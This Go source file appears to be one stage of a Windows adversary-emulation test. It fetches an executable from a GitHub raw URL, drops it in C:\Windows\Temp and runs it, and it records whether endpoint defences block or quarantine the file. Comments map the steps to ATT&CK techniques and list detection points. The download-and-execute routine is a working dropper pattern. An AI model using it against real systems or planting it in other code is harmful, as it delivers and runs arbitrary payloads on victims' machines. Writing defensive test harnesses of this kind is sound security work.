//go:build windows
// +build windows

/*
STAGE 3 (v2): GitHub-Raw PE Fetch & Execute
         (T1105 - Ingress Tool Transfer + T1204.002 - User Execution: Malicious File)

v2 CHANGES FROM v1:
  - REMOVED: hosts-file backup / modify / restore, self-signed loopback
    Discord-CDN server, cert pinning, host-header spoof, CDN attachment
    URL path, minimal-unsigned-PE builder, SIGINT/SIGTERM/defer/panic
    hosts-file restoration handlers.
  - ADDED: simple HTTPS GET against raw.githubusercontent.com for a
    pre-staged F0RT1KA-signed payload PE (stage2_payload.exe), drop to
    c:\Windows\Temp, execute.
  - RATIONALE: Q1=C / Q3 resolution. We are NOT using cdn.discordapp.com
    SNI (risk of tripping corporate egress filters). GitHub-raw is the
    trusted-hosting infrastructure analogue. The ATT&CK mapping shifts
    from T1583.006 (Acquire Web Services / Discord CDN abuse) + T1565.001
    (hosts file manipulation) to pure T1105 (Ingress Tool Transfer) +
    T1204.002 (User Execution). Real IOCs: live TLS+DNS+CDN to GitHub.

Detection opportunities:
  - Non-browser / non-git process issuing HTTPS GET to raw.githubusercontent.com
    for a .exe URL (combination of SNI + URL-path.exe is the signal)
  - DNS EventID 22 for raw.githubusercontent.com from a binary in c:\F0
  - PE file write under c:\Windows\Temp from a non-installer process
  - Process creation of that dropped PE from c:\Windows\Temp
*/

package main

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"time"
)

const (
	TEST_UUID      = "e5472cd5-c799-4b07-b455-8c02665ca4cf"
	TECHNIQUE_ID   = "T1105"
	TECHNIQUE_NAME = "GitHub-Raw PE Fetch & Execute"
	STAGE_ID       = 3

	// One-time lab setup: upload stage2_payload.exe (F0RT1KA-signed benign
	// marker PE) to a GitHub repo you control, then update this constant.
	// See lab_assets/README.md.
	STAGE3_PAYLOAD_URL = "https://raw.githubusercontent.com/projectachilles/ProjectAchilles/main/lab-assets/honestcue/v2/stage2_payload.exe"

	DROPPED_PE_PATH      = `C:\Windows\Temp\honestcue_payload.exe`
	ARTIFACT_MARKER_PATH = `c:\Users\fortika-test\honestcue_payload_marker.txt`

	NETWORK_LOG = `c:\F0\stage3_network.log`
)

const (
	StageSuccess     = 0
	StageBlocked     = 126
	StageQuarantined = 105
	StageError       = 999
)

func main() {
	AttachLogger(TEST_UUID, fmt.Sprintf("Stage %d: %s", STAGE_ID, TECHNIQUE_ID))

	LogMessage("INFO", TECHNIQUE_ID, "Starting GitHub-raw PE fetch + execute")
	LogStageStart(STAGE_ID, TECHNIQUE_ID,
		"HTTPS GET to raw.githubusercontent.com for pre-staged PE; drop to %TEMP%; execute")

	err := performTechnique()
	if err != nil {
		fmt.Printf("[STAGE %s] Technique failed: %v\n", TECHNIQUE_ID, err)
		LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("Technique failed: %v", err))

		exitCode := determineExitCode(err)
		if exitCode == StageBlocked || exitCode == StageQuarantined {
			LogStageBlocked(STAGE_ID, TECHNIQUE_ID, err.Error())
		} else {
			LogStageEnd(STAGE_ID, TECHNIQUE_ID, "error", err.Error())
		}
		os.Exit(exitCode)
	}

	fmt.Printf("[STAGE %s] GitHub-raw PE fetch + execute succeeded\n", TECHNIQUE_ID)
	LogMessage("SUCCESS", TECHNIQUE_ID, "GitHub-raw PE fetch + execute succeeded")
	LogStageEnd(STAGE_ID, TECHNIQUE_ID, "success",
		"HTTPS GET to GitHub-raw returned payload; dropped to %TEMP%; executed; marker written")
	os.Exit(StageSuccess)
}

func performTechnique() error {
	// Ensure LOG_DIR and drop directories exist
	if err := os.MkdirAll(filepath.Dir(NETWORK_LOG), 0755); err != nil {
		return fmt.Errorf("log dir creation: %v", err)
	}
	if err := os.MkdirAll(filepath.Dir(DROPPED_PE_PATH), 0755); err != nil {
		return fmt.Errorf("temp dir creation: %v", err)
	}

	netLog, logErr := os.OpenFile(NETWORK_LOG, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
	if logErr != nil {
		LogMessage("WARN", TECHNIQUE_ID, fmt.Sprintf("Could not open network log %s: %v", NETWORK_LOG, logErr))
	}
	if netLog != nil {
		defer netLog.Close()
		fmt.Fprintf(netLog, "[%s] stage3 start; target_url=%s\n",
			time.Now().UTC().Format(time.RFC3339), STAGE3_PAYLOAD_URL)
	}

	// Real HTTPS to GitHub; no cert pinning.
	client := &http.Client{
		Timeout: 20 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				MinVersion: tls.VersionTLS12,
			},
		},
	}

	req, err := http.NewRequest("GET", STAGE3_PAYLOAD_URL, nil)
	if err != nil {
		return fmt.Errorf("http request build: %v", err)
	}
	req.Header.Set("User-Agent", "HonestcueDownloader/1.0 (simulated)")
	req.Header.Set("Accept", "application/octet-stream")

	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Issuing HTTPS GET to %s", STAGE3_PAYLOAD_URL))
	if netLog != nil {
		fmt.Fprintf(netLog, "[%s] GET %s (UA=HonestcueDownloader/1.0)\n",
			time.Now().UTC().Format(time.RFC3339), STAGE3_PAYLOAD_URL)
	}

	startTime := time.Now()
	resp, err := client.Do(req)
	fetchDuration := time.Since(startTime)
	if err != nil {
		if netLog != nil {
			fmt.Fprintf(netLog, "[%s] GET failed after %v: %v\n",
				time.Now().UTC().Format(time.RFC3339), fetchDuration, err)
		}
		return fmt.Errorf("https get to github raw unavailable: %v", err)
	}
	defer resp.Body.Close()

	if netLog != nil {
		tlsState := resp.TLS
		tlsVer := "unknown"
		peerName := "unknown"
		if tlsState != nil {
			switch tlsState.Version {
			case tls.VersionTLS12:
				tlsVer = "TLS 1.2"
			case tls.VersionTLS13:
				tlsVer = "TLS 1.3"
			}
			if len(tlsState.PeerCertificates) > 0 {
				peerName = tlsState.PeerCertificates[0].Subject.CommonName
			}
		}
		fmt.Fprintf(netLog, "[%s] response: status=%d tls=%s peer_cn=%q duration=%v\n",
			time.Now().UTC().Format(time.RFC3339), resp.StatusCode, tlsVer, peerName, fetchDuration)
	}

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("github raw returned non-200 status: %d (lab asset may not be uploaded; see lab_assets/README.md)", resp.StatusCode)
	}

	peBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("read response body: %v", err)
	}
	if len(peBytes) < 512 {
		return fmt.Errorf("payload too small (%d bytes) - lab asset malformed?", len(peBytes))
	}
	// Sanity check: MZ header
	if !bytes.HasPrefix(peBytes, []byte{'M', 'Z'}) {
		return fmt.Errorf("payload not a PE (missing MZ header) - lab asset malformed?")
	}
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Received %d bytes from GitHub-raw (MZ verified)", len(peBytes)))

	// Drop PE to %TEMP%
	if err := os.WriteFile(DROPPED_PE_PATH, peBytes, 0755); err != nil {
		return fmt.Errorf("dropped PE write: %v", err)
	}
	LogFileDropped("honestcue_payload.exe", DROPPED_PE_PATH, int64(len(peBytes)), false)
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Payload dropped at %s", DROPPED_PE_PATH))

	// Verify drop survived quarantine
	time.Sleep(1500 * time.Millisecond)
	if _, err := os.Stat(DROPPED_PE_PATH); os.IsNotExist(err) {
		LogFileDropped("honestcue_payload.exe", DROPPED_PE_PATH, int64(len(peBytes)), true)
		return fmt.Errorf("dropped PE quarantined after write")
	}

	// Execute the dropped PE directly
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Executing dropped payload: %s", DROPPED_PE_PATH))
	cmd := exec.Command(DROPPED_PE_PATH)
	var outBuf bytes.Buffer
	cmd.Stdout = io.MultiWriter(os.Stdout, &outBuf)
	cmd.Stderr = io.MultiWriter(os.Stderr, &outBuf)
	runErr := cmd.Run()
	if runErr != nil {
		if exitErr, ok := runErr.(*exec.ExitError); ok {
			code := exitErr.ExitCode()
			LogProcessExecution("honestcue_payload.exe", DROPPED_PE_PATH, 0, false, code, exitErr.Error())
			return fmt.Errorf("dropped payload exited with code %d", code)
		}
		LogProcessExecution("honestcue_payload.exe", DROPPED_PE_PATH, 0, false, -1, runErr.Error())
		return fmt.Errorf("payload spawn: %v", runErr)
	}
	LogProcessExecution("honestcue_payload.exe", DROPPED_PE_PATH, 0, true, 0, "")

	// Verify marker
	time.Sleep(500 * time.Millisecond)
	info, err := os.Stat(ARTIFACT_MARKER_PATH)
	if err != nil {
		return fmt.Errorf("payload marker %s missing after execution: %v", ARTIFACT_MARKER_PATH, err)
	}
	LogFileDropped("honestcue_payload_marker.txt", ARTIFACT_MARKER_PATH, info.Size(), false)
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Payload marker confirmed: %s (%d bytes)", ARTIFACT_MARKER_PATH, info.Size()))

	LogMessage("INFO", TECHNIQUE_ID,
		"Detection points: HTTPS GET to raw.githubusercontent.com for .exe URL, "+
			"DNS EventID 22, PE dropped to c:\\Windows\\Temp, process exec from %TEMP%")

	return nil
}

// ==============================================================================
// EXIT CODE DETERMINATION
// ==============================================================================

func determineExitCode(err error) int {
	if err == nil {
		return StageSuccess
	}
	errStr := err.Error()
	if containsAny(errStr, []string{"access denied", "access is denied", "permission denied", "operation not permitted"}) {
		return StageBlocked
	}
	if containsAny(errStr, []string{"quarantined", "virus", "threat"}) {
		return StageQuarantined
	}
	if containsAny(errStr, []string{"not found", "does not exist", "no such", "not running", "not available", "unavailable", "unreachable", "no such host", "missing"}) {
		return StageError
	}
	if containsAny(errStr, []string{"bad certificate", "certificate verify failed", "tls handshake", "x509"}) {
		return StageBlocked
	}
	return StageError
}

func containsAny(s string, substrings []string) bool {
	for _, substr := range substrings {
		if containsCI(s, substr) {
			return true
		}
	}
	return false
}

func containsCI(s, substr string) bool {
	return len(s) >= len(substr) && indexIgnoreCase(s, substr) >= 0
}

func indexIgnoreCase(s, substr string) int {
	s = toLowerStr(s)
	substr = toLowerStr(substr)
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return i
		}
	}
	return -1
}

func toLowerStr(s string) string {
	result := make([]byte, len(s))
	for i := 0; i < len(s); i++ {
		c := s[i]
		if c >= 'A' && c <= 'Z' {
			c = c + ('a' - 'A')
		}
		result[i] = c
	}
	return string(result)
}
